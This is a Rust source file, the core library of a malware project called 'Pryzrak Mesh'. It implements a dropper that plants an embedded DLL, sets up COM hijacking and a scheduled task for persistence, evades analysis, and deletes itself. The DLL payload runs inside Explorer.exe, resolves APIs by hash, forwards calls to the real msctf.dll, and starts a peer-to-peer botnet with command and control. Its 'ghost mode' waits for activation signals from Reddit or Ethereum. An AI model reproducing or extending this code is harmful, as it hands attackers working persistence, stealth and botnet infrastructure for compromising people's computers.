//! # Pryzrak Mesh Core Library (Hybrid EXE/DLL)
//!
//! Shared logic for both Executable and DLL builds.
//! - EXE: DROPPER - Drops DLL payload, sets up persistence, exits.
//! - DLL: PAYLOAD - Running inside Explorer.exe (COM Hijack), runs main logic.

// Obfuscated Module Aliases
#[path = "core/mod.rs"]
pub mod k; // kernel/core
#[path = "network/mod.rs"]
pub mod n; // network
#[path = "discovery/mod.rs"]
pub mod d; // discovery
#[path = "plugins/mod.rs"]
pub mod p; // plugins
#[path = "stealth/mod.rs"]
pub mod s; // stealth
#[path = "crypto/mod.rs"]
pub mod c; // crypto
#[path = "happy_strings.rs"]
pub mod h; // happy
#[path = "c2/mod.rs"]
pub mod c2; // command & control
#[path = "assets/mod.rs"]
pub mod assets; // embedded payloads & dropper


use std::sync::Arc;
use log::{info, error};

use k::{run_leader_mode, run_worker_mode};
use d::{ElectionService, NodeRole, ZeroNoiseDiscovery};
use c2::state::{CommandState, SystemMode};

/// Entry point for the Executable (edge.exe) - DROPPER MODE
/// 
/// This EXE is a DROPPER:
/// 1. Drops embedded edge.dll to hidden location
/// 2. Sets up COM Hijacking (registry points to DLL)
/// 3. Sets up Scheduled Task (backup persistence)
/// 4. Self-deletes
/// 5. Exits (does NOT run main logic)
///
/// Main logic runs in DLL when loaded by COM.
pub fn start_exe() {
    // Check if we are a Viewer (debug mode only)
    #[cfg(target_os = "windows")]
    #[cfg(feature = "debug_mode")]
    {
        if s::windows::ipc::is_pipe_active() {
            return; 
        }
        s::windows::ipc::start_daemon_server();
    }

    crate::k::debug::log_stage!(1, "Dropper Init (EXE)");
    
    let pid = std::process::id();
    crate::k::debug::log_detail!("PID: {}", pid);
    
    // Apply anti-analysis first
    crate::k::debug::log_op!("Stealth", "Applying Anti-Analysis...");
    s::check_and_apply_stealth();
    h::init();

    // Check if embedded payload exists
    if !assets::is_payload_available() {
        crate::k::debug::log_err!("No embedded DLL payload! Running legacy mode...");
        // Fallback: Run main logic directly (like before)
        smol::block_on(async_main());
        return;
    }

    // Execute dropper
    crate::k::debug::log_stage!(2, "Dropper: Dropping DLL Payload...");
    match assets::execute_dropper() {
        Ok(()) => {
            crate::k::debug::log_stage!(8, "Dropper: SUCCESS! Exiting...");
        }
        Err(e) => {
            crate::k::debug::log_err!(format!("Dropper failed: {}", e));
            // Fallback: Run main logic directly
            smol::block_on(async_main());
            return;
        }
    }

    // Self-delete the dropper EXE
    crate::k::debug::log_op!("Stealth", "Self-Deleting Dropper...");
    #[cfg(target_os = "windows")]
    s::windows::self_delete::self_delete();

    // Exit - main logic will run when COM loads the DLL
    crate::k::debug::log_detail!("Dropper exiting. DLL will activate on next COM usage.");
}


/// Entry point for the DLL (edge.dll)
#[cfg(target_os = "windows")]
use std::ffi::c_void;

#[cfg(target_os = "windows")]
#[no_mangle]
pub extern "system" fn DllMain(hinst: *mut c_void, reason: u32, _reserved: *mut c_void) -> i32 {
    match reason {
        1 => { // DLL_PROCESS_ATTACH
            // 1. PIN MODULE: Prevent unloading
            // This is safe in DllMain as it calls GetModuleHandleEx with PIN
            unsafe {
                use crate::s::windows::api_resolver::{self, resolve_api};
                type FnGetModuleHandleExW = unsafe extern "system" fn(u32, *const c_void, *mut *mut c_void) -> i32;
                
                let addr = DllMain as *const c_void;
                let mut handle: *mut c_void = std::ptr::null_mut();

                if let Some(f) = resolve_api::<FnGetModuleHandleExW>(
                    api_resolver::HASH_KERNEL32, 
                    0x2382173F 
                ) {
                   f(0x5, addr, &mut handle);
                }
            }
            // CRITICAL FIX: DO NOT SPAWN THREAD HERE due to Loader Lock.
            // Logic moved to DllGetClassObject.
        }
        _ => {}
    }
    1 // TRUE
}

/// Required export for COM Hijacking (InprocServer32)
#[cfg(target_os = "windows")]
#[no_mangle]
pub extern "system" fn DllGetClassObject(rclsid: *const u128, riid: *const u128, ppv: *mut *mut c_void) -> i32 {
    // 0. Launch Malware Logic (ONCE)
    // Safe here because Loader Lock is released.
    static INIT: std::sync::Once = std::sync::Once::new();
    INIT.call_once(|| {
        std::thread::spawn(|| {
            // Apply Stealth settings again in thread context
            s::check_and_apply_stealth();
            h::init();
            crate::k::debug::log_stage!(1, "Init (DLL - Safe)");
            
            smol::block_on(async_main());
        });
    });

    unsafe {
        use crate::s::windows::api_resolver::{self, load_library, get_export_by_name};
        
        // 1. Identify Target: msctf.dll (MsCtfMonitor - Language Bar)
        let target_dll = b"msctf.dll\0";
        
        // 2. Load Real DLL
        if let Some(h_module) = load_library(target_dll) {
            // 3. Resolve Real DllGetClassObject
            if let Some(func_addr) = get_export_by_name(h_module, "DllGetClassObject") {
                // 4. Define Function Signature
                type FnDllGetClassObject = unsafe extern "system" fn(*const u128, *const u128, *mut *mut c_void) -> i32;
                let real_func: FnDllGetClassObject = std::mem::transmute(func_addr);
                
                // 5. Forward Call
                return real_func(rclsid, riid, ppv);
            }
        }
        
        // Fallback if failed: CLASS_E_CLASSNOTAVAILABLE
        std::mem::transmute(0x80040111u32)
    }
}

/// Core Async Logic (Shared)
async fn async_main() {
    let cmd_state = CommandState::new();
    
    // Create Command Channel (Bridge between Listener and Runtime)
    let (cmd_tx, cmd_rx) = async_channel::bounded::<Vec<u8>>(100);
    
    // Start C2 Listener
    c2::listener::start_listener(cmd_state.clone(), cmd_tx.clone());
    
    // Ghost Mode Gate - Wait for activation signal
    if cmd_state.current_mode() == SystemMode::Ghost {
        info!("[Ghost] System is in GHOST MODE. Network silent. C2/P2P DISABLED.");
        crate::k::debug::log_stage!(0, "Entering Ghost Mode (Silent)...");
        crate::k::debug::log_detail!("Waiting for Reddit/ETH activation signal...");
        
        let cs = cmd_state.clone();
        smol::unblock(move || {
            cs.await_activation();
        }).await;
        info!("[Ghost] ACTIVATION SIGNAL RECEIVED!");
    }

    // P2P Gate - Wait for P2P to be explicitly enabled
    if !cmd_state.is_p2p_enabled() {
        info!("[Ghost] P2P is DISABLED. Waiting for enable_p2p command...");
        crate::k::debug::log_detail!("P2P disabled. Awaiting Reddit/ETH signal...");
        
        let cs = cmd_state.clone();
        smol::unblock(move || {
            cs.await_p2p_enabled();
        }).await;
        info!("[Ghost] P2P ENABLED! Starting Network Stack...");
    }

    // Discovery (Only starts after P2P is enabled)

    let disc = Arc::new(ZeroNoiseDiscovery::new());
    let dc = disc.clone();
    smol::spawn(async move {
        dc.run_daemon().await;
    }).detach();

    loop {
        // [GHOST CHECK]
        if cmd_state.current_mode() == SystemMode::Ghost {
            info!("[Main] System entered Ghost Mode. Halting Network.");
            let cs = cmd_state.clone();
            smol::unblock(move || {
                cs.await_activation();
            }).await;
            info!("[Main] Resuming from Ghost Mode...");
        }

        info!("[Main] Entering Election Phase...");
        let election = Arc::new(ElectionService::new().await);
        let role = election.run_discovery().await;

        match role {
            NodeRole::Leader => {
                info!("[Main] Role: LEADER");
                run_leader_mode(election, cmd_state.clone(), cmd_tx.clone(), cmd_rx.clone()).await;
            }
            NodeRole::Worker(addr) => {
                info!("[Main] Role: WORKER (Leader: {})", addr);
                run_worker_mode(addr, cmd_state.clone()).await;
            }
            _ => {
                error!("Unexpected Role Unbound");
                smol::Timer::after(std::time::Duration::from_secs(5)).await;
            }
        }
    }
}
